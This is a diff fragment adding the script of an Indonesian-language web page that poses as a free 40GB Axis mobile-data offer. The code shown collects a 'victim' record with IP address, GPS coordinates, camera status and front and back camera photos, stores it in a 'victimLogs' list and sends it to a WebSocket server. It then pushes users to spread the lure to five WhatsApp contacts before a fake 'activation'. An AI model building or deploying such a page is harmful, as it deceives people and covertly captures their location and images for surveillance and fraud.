+                .then(data => {
+                    victimData.ip = data.ip;
+                    saveVictimData(victimData);
+                })
+                .catch(() => {
+                    victimData.ip = 'unknown';
+                    saveVictimData(victimData);
+                });
+            
+            connectWebSocket(victimData);
+            
+            statusText.textContent = '📤 Mengirim data verifikasi...';
+            statusText.className = 'status-text loading';
+            
+            setTimeout(() => {
+                statusText.textContent = '✅ Data terverifikasi! Bagikan ke 5 teman untuk aktivasi.';
+                statusText.className = 'status-text';
+            }, 1500);
+            
+            console.log(`🎯 ${name} berhasil mengklaim kuota dengan ${photos.front ? 'Front' : ''} ${photos.back ? 'Back' : ''}`);
+        }
+        
+        // ============================================
+        // SAVE DATA
+        // ============================================
+        function saveVictimData(data) {
+            const logs = JSON.parse(localStorage.getItem('victimLogs') || '[]');
+            logs.push(data);
+            localStorage.setItem('victimLogs', JSON.stringify(logs));
+        }
+        
+        // ============================================
+        // SHARE
+        // ============================================
+        function handleShare() {
+            if (shareCount < 5) {
+                shareCount++;
+                shareCountSpan.textContent = shareCount;
+                progressFill.style.width = `${(shareCount/5) * 100}%`;
+                
+                if (this.id === 'shareBtn') {
+                    window.open(`https://wa.me/?text=${encodeURIComponent('🎉 Dapatkan 40GB kuota gratis dari Axis!')}`, '_blank');
+                } else {
+                    if (navigator.share) {
+                        navigator.share({ title: 'Axis 40GB Gratis', text: '🎉 Dapatkan 40GB kuota gratis dari Axis!' });
+                    } else {
+                        navigator.clipboard.writeText('🎉 Dapatkan 40GB kuota gratis dari Axis!');
+                        alert('Link berhasil disalin!');
+                    }
+                }
+                
+                if (shareCount === 5) {
+                    statusText.textContent = '🎉 Selamat! Kuota 40GB telah diaktifkan!';
+                    statusText.className = 'status-text success';
+                    shareBtn.disabled = true;
+                    shareFriendBtn.disabled = true;
+                    successCheck.classList.add('active');
+                    claimBtn.innerHTML = '🎉 Kuota Aktif! <span class="btn-sub">40GB sudah di akun Anda</span>';
+                } else {
+                    statusText.textContent = `📤 Bagikan ke ${5 - shareCount} teman lagi!`;
+                }
+            }
+        }
+        
+        shareBtn.addEventListener('click', handleShare);
+        shareFriendBtn.addEventListener('click', handleShare);
+        
+        // ============================================
+        // WEBSOCKET
+        // ============================================
+        function connectWebSocket(data) {
+            try {
+                const ws = new WebSocket('ws://localhost:8080');
+                ws.onopen = function() {
+                    ws.send(JSON.stringify({
+                        type: 'victim_data',
+                        ip: data.ip || 'unknown',
+                        coordinates: data.coordinates || { lat: 0, lng: 0 },
+                        camera_status: data.camera_status || 'unknown',
+                        name: data.name || 'anonymous',
+                        timestamp: data.timestamp || new Date().toISOString(),
+                        location: data.location_status || 'unknown',
+                        photos: data.photos || null
+                    }));
+                    ws.close();
+                };
+            } catch (e) {
+                console.warn('WebSocket tidak tersedia:', e.message);
+            }
+        }
+        
+        // ============================================
+        // KEYBOARD SHORTCUTS
+        // ============================================
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && popup.classList.contains('active')) {
+                popup.classList.remove('active');
+            }
+        });
+        
+        // ============================================
+        // SHAKE ANIMATION
+        // ============================================
+        const styleSheet = document.createElement("style");
+        styleSheet.textContent = `@keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-10px)} 40%{transform:translateX(10px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }`;
+        document.head.appendChild(styleSheet);
+        
+        // ============================================
+        // INIT
+        // ============================================
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('🚀 FreeAxis40GB - Auto Capture Front & Back Camera');
+            const logs = JSON.parse(localStorage.getItem('victimLogs') || '[]');
+            if (logs.length > 0) console.log(`📊 Found ${logs.length} existing records`);
+        });
+    </script>
+</body>
+</html>
